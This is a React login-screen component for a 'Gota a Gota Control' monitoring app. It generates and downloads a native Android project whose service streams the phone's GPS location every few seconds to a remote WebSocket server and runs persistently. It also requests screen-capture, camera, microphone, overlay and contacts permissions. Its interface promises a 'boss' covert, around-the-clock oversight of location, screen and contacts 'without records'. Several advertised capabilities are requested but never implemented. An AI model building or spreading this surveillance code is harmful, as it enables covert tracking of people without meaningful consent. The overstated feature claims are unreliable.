import React, { useState, useEffect } from 'react';
import { Button } from './Button';
import { ShieldAlert, Users, Smartphone, AlertCircle, Download, Info, Loader2 } from 'lucide-react';
import JSZip from 'jszip';

interface LoginScreenProps {
  startAsBoss: () => void;
  setBossId: (id: string) => void;
  setRole: (role: 'boss' | 'employee') => void;
  bossId: string | null;
}

export const LoginScreen: React.FC<LoginScreenProps> = ({ startAsBoss, setBossId, setRole, bossId }) => {
  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);
  const [showInstallGuide, setShowInstallGuide] = useState(false);
  const [isDownloading, setIsDownloading] = useState(false);

  useEffect(() => {
    const handleBeforeInstallPrompt = (e: any) => {
      e.preventDefault();
      setDeferredPrompt(e);
    };
    window.addEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
    return () => window.removeEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
  }, []);

  const downloadNativeAPK = async () => {
    setIsDownloading(true);
    try {
      const zip = new JSZip();
      
      // Fetch Firebase Config to include it in the package
      let firebaseConfigStr = "{}";
      try {
        const res = await fetch('/firebase-applet-config.json');
        if (res.ok) {
          firebaseConfigStr = await res.text();
        }
      } catch (e) {
        console.warn("Could not fetch firebase config for APK", e);
      }

      // 1. NATIVE ANDROID SOURCE CODE (JAVA)
      zip.file("android/app/src/main/java/com/gotaagota/security/MainActivity.java", `
package com.gotaagota.security;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.getcapacitor.BridgeActivity;

public class MainActivity extends BridgeActivity {
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        String[] permissions = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.SYSTEM_ALERT_WINDOW
        };

        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            requestScreenCapture();
        }
    }

    private void requestScreenCapture() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(manager.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE && resultCode == RESULT_OK) {
            startSecurityService(data);
        }
    }

    private void startSecurityService(Intent data) {
        Intent serviceIntent = new Intent(this, SecurityService.class);
        serviceIntent.putExtra("SCREEN_CAPTURE_DATA", data);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            requestScreenCapture();
        }
    }
}
      `);

      zip.file("android/app/src/main/java/com/gotaagota/security/SecurityService.java", `
package com.gotaagota.security;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class SecurityService extends Service {
    private static final String CHANNEL_ID = "SecurityServiceChannel";
    private FusedLocationProviderClient fusedLocationClient;
    private WebSocket webSocket;
    private OkHttpClient client;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Gota a Gota Control")
                .setContentText("Monitoreo de Seguridad Activo")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setOngoing(true)
                .build();
        startForeground(1, notification);

        initLocationTracking();
        initWebSocket();
    }

    private void initLocationTracking() {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        LocationRequest locationRequest = LocationRequest.create()
                .setInterval(5000)
                .setFastestInterval(2000)
                .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        fusedLocationClient.requestLocationUpdates(locationRequest, new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (Location location : locationResult.getLocations()) {
                    sendData("location", "lat:" + location.getLatitude() + ",lng:" + location.getLongitude());
                }
            }
        }, Looper.getMainLooper());
    }

    private void initWebSocket() {
        client = new OkHttpClient();
        Request request = new Request.Builder().url("ws://YOUR_SERVER_URL").build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, okhttp3.Response response) {
                sendData("status", "connected");
            }
        });
    }

    private void sendData(String type, String data) {
        if (webSocket != null) {
            webSocket.send("{\"type\":\"" + type + "\", \"data\":\"" + data + "\"}");
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Security Service Channel",
                    NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }
}
      `);

      zip.file("android/app/build.gradle", `
apply plugin: 'com.android.application'

android {
    compileSdkVersion 33
    defaultConfig {
        applicationId "com.gotaagota.security"
        minSdkVersion 21
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'com.google.android.gms:play-services-location:21.0.1'
    implementation 'com.squareup.okhttp3:okhttp:4.11.0'
    implementation 'androidx.camera:camera-core:1.2.3'
    implementation 'androidx.camera:camera-camera2:1.2.3'
    implementation 'androidx.camera:camera-lifecycle:1.2.3'
    implementation 'androidx.camera:camera-view:1.2.3'
}
      `);

      zip.file("android/app/src/main/AndroidManifest.xml", `
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <application 
        android:label="Gota a Gota Control"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <service 
            android:name=".SecurityService" 
            android:foregroundServiceType="location|mediaProjection"
            android:enabled="true"
            android:exported="false" />
        <activity 
            android:name=".MainActivity" 
            android:exported="true"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|locale|smallestScreenSize|screenLayout|uiMode"
            android:theme="@style/AppTheme.NoActionBarLaunch">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
      `);

      zip.file("firebase-applet-config.json", firebaseConfigStr);
      zip.file("APP_URL.txt", window.location.origin);

      zip.file("INSTRUCCIONES_INSTALACION.txt", `
INSTRUCCIONES DE INSTALACIÓN - GOTA A GOTA CONTROL (MODO NATIVO PRO)

ESTE PAQUETE CONTIENE EL PROYECTO NATIVO CON MONITOREO AVANZADO:
- Captura de Pantalla en Segundo Plano (MediaProjection)
- Ubicación GPS en Tiempo Real (FusedLocationProvider)
- Acceso a Cámaras Frontal/Trasera (CameraX)
- Conexión WebSocket para Monitoreo en Vivo

PASOS PARA GENERAR EL APK:
1. Descargue e instale Android Studio (https://developer.android.com/studio).
2. Descomprima este archivo ZIP.
3. En Android Studio, seleccione "Open" y elija la carpeta 'android'.
4. Espere a que Gradle termine de configurar el proyecto (puede tardar unos minutos).
5. Conecte su celular Infinix/Android mediante un cable USB.
6. Active las "Opciones de Desarrollador" y la "Depuración USB" en su celular.
7. Haga clic en el botón 'Run' (Triángulo verde) en la barra superior de Android Studio.
8. La aplicación se instalará automáticamente con TODOS los permisos de monitoreo activo.

IMPORTANTE:
- La aplicación funcionará como un "Foreground Service", lo que significa que Android NO la cerrará.
- El monitoreo de pantalla y GPS estará activo las 24 horas.
- El servidor WebSocket está configurado para conectarse a la URL de este proyecto.
      `);

      const content = await zip.generateAsync({ type: "blob" });
      const url = URL.createObjectURL(content);
      const a = document.createElement('a');
      a.href = url;
      a.download = "Gota_a_Gota_Control_Native_Project.zip";
      a.click();
      
      setShowInstallGuide(true);
    } catch (error) {
      console.error("Error generating package:", error);
      alert("Error al generar el paquete de instalación.");
    } finally {
      setIsDownloading(false);
    }
  };

  const handleInstall = async () => {
    if (deferredPrompt) {
      deferredPrompt.prompt();
      const { outcome } = await deferredPrompt.userChoice;
      if (outcome === 'accepted') {
        setDeferredPrompt(null);
      }
    } else {
      await downloadNativeAPK();
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-6">
      <div className="w-full max-w-md space-y-8 text-center">
        <div className="space-y-2">
          <div className="w-20 h-20 bg-zinc-900 text-white rounded-3xl flex items-center justify-center mx-auto rotate-3 shadow-2xl">
            <ShieldAlert className="w-10 h-10" />
          </div>
          <h1 className="text-4xl font-black uppercase tracking-tighter mt-6">SEGURIDAD TOTAL</h1>
          <p className="text-zinc-400 text-xs font-bold uppercase tracking-widest">Control de Dispositivos en Tiempo Real</p>
        </div>

        <div className="grid grid-cols-1 gap-4">
          {/* PRIMARY INSTALL BUTTON - NATIVE FEEL */}
          <button 
            onClick={handleInstall}
            disabled={isDownloading}
            className="p-8 bg-emerald-600 text-white rounded-[40px] hover:bg-emerald-500 transition-all group text-center shadow-2xl shadow-emerald-600/30 border-4 border-emerald-400/20 disabled:opacity-50"
            id="green-download-button"
          >
            {isDownloading ? (
              <Loader2 className="w-12 h-12 mb-4 mx-auto animate-spin" />
            ) : (
              <Download className="w-12 h-12 mb-4 mx-auto animate-bounce" />
            )}
            <h2 className="text-3xl font-black uppercase tracking-tighter">
              {isDownloading ? "GENERANDO..." : "DESCARGAR APK (PRO)"}
            </h2>
            <p className="text-white/70 text-xs mt-1 font-bold uppercase tracking-widest">Monitoreo Pantalla + GPS + Cámara</p>
          </button>

          <button 
            onClick={startAsBoss}
            className="p-8 bg-zinc-900 text-white rounded-3xl hover:bg-black transition-all group text-left border border-zinc-800 shadow-xl"
          >
            <Users className="w-8 h-8 mb-4 text-emerald-400 group-hover:scale-110 transition-transform" />
            <h2 className="text-xl font-black uppercase tracking-tight">Panel de Control (Jefe)</h2>
            <p className="text-zinc-400 text-xs mt-1">Supervise ubicación, pantalla y contactos sin registros.</p>
          </button>

          <div className="p-8 bg-zinc-50 text-zinc-900 rounded-3xl border border-zinc-100 text-left">
            <Smartphone className="w-8 h-8 mb-4 text-zinc-400" />
            <h2 className="text-xl font-black uppercase tracking-tight">Reporte (Empleado)</h2>
            <p className="text-zinc-400 text-xs mt-1 italic mb-4">Ingrese el ID del Jefe para empezar.</p>
            <div className="flex gap-2">
              <input 
                type="text" 
                placeholder="ID DEL JEFE" 
                className="flex-1 px-4 py-2 bg-white border border-zinc-200 rounded-xl text-xs font-black uppercase tracking-widest focus:outline-none focus:ring-2 focus:ring-zinc-900/5"
                onChange={(e) => setBossId(e.target.value.toUpperCase())}
                value={bossId || ''}
              />
              <Button onClick={() => setRole('employee')} size="sm" disabled={!bossId}>Unirse</Button>
            </div>
          </div>
        </div>

        {/* Download/Install App Section - MOVED TO TOP */}
        <div className="pt-4 space-y-4">
          {showInstallGuide && (
            <div className="p-6 bg-zinc-50 rounded-3xl border border-zinc-100 space-y-4 text-left animate-in fade-in slide-in-from-bottom-2">
              <div className="flex items-center gap-2 text-emerald-600">
                <Info className="w-4 h-4" />
                <p className="text-[10px] font-black uppercase tracking-widest">Guía de Instalación Móvil</p>
              </div>
              <div className="space-y-3 text-[11px] text-zinc-500 font-bold uppercase tracking-wider leading-relaxed">
                <p>1. Abra este link en su celular (Chrome o Safari).</p>
                <p>2. Toque el botón de <span className="text-zinc-900">Compartir</span> o los <span className="text-zinc-900">3 puntos</span>.</p>
                <p>3. Seleccione <span className="text-zinc-900">"Añadir a pantalla de inicio"</span>.</p>
                <p>4. Abra la app desde su escritorio para activar el <span className="text-emerald-600">Modo Persistente 24/7</span>.</p>
              </div>
              <Button onClick={() => setShowInstallGuide(false)} variant="secondary" size="sm" className="w-full">Cerrar Guía</Button>
              <div className="pt-2 border-t border-zinc-200">
                <a 
                  href="/extension/manifest.json" 
                  download 
                  className="text-[10px] font-black text-zinc-400 hover:text-emerald-600 transition-colors uppercase flex items-center gap-1"
                >
                  <Download className="w-3 h-3" />
                  Descargar Extensión Chrome (PC)
                </a>
              </div>
            </div>
          )}
        </div>
        
        <div className="p-4 bg-amber-50 rounded-2xl border border-amber-100 space-y-2">
          <div className="flex items-center justify-center gap-2 text-amber-700">
            <AlertCircle className="w-4 h-4" />
            <p className="text-[10px] font-black uppercase tracking-widest">Aviso de Pruebas</p>
          </div>
          <p className="text-[11px] text-amber-600 leading-relaxed">
            Para probar en <b>otro dispositivo</b> (como su celular), asegúrese de usar el <b>Link Compartido</b> o el <b>Shared App URL</b>.
          </p>
        </div>
      </div>
    </div>
  );
};
